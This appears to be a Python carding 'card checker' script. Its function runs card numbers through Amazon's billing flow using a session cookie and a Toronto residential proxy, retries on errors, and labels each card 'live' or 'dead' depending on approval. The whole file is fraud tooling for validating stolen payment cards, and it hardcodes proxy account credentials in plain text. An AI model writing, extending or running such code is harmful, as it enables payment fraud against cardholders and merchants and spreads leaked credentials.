from gates.amazon_gateway.main import CookieContext

def procesar_tarjeta(cc: str, cookie: str, retry: int = 0) -> dict:
    model = CookieContext(
        card=cc,
        cookie=cookie,
        proxy="package-337471-country-ca-region-ontario-city-toronto:WypkQnjGvTT0drPE@proxy.soax.com:5000"
    )

    try:
        response = model.buildFlowBilling()

        if not isinstance(response, dict):
            return {
                'status': 'error',
                'cc': cc,
                'message': 'Invalid response from gateway'
            }

        # 🔴 SI COOKIE EXPIRADA
        if response.get("status") is False:
            return {
                'status': 'error',
                'cc': cc,
                'message': response.get("message") or "Cookie expired"
            }

        # 🟢 SI RESPONSE OK
        if response.get("success") is True:
            return {
                'status': 'live',
                'cc': cc,
                'message': response.get("message") or "Approved",
                'gateway': response.get("gateway", "AMAZON")
            }

        else:
            return {
                'status': 'dead',
                'cc': cc,
                'message': response.get("message") or "Declined",
                'gateway': response.get("gateway", "AMAZON")
            }

    except Exception as e:
        if retry < 3:
            return procesar_tarjeta(cc, cookie, retry + 1)

        return {
            'status': 'error',
            'cc': cc,
            'message': str(e)
        }
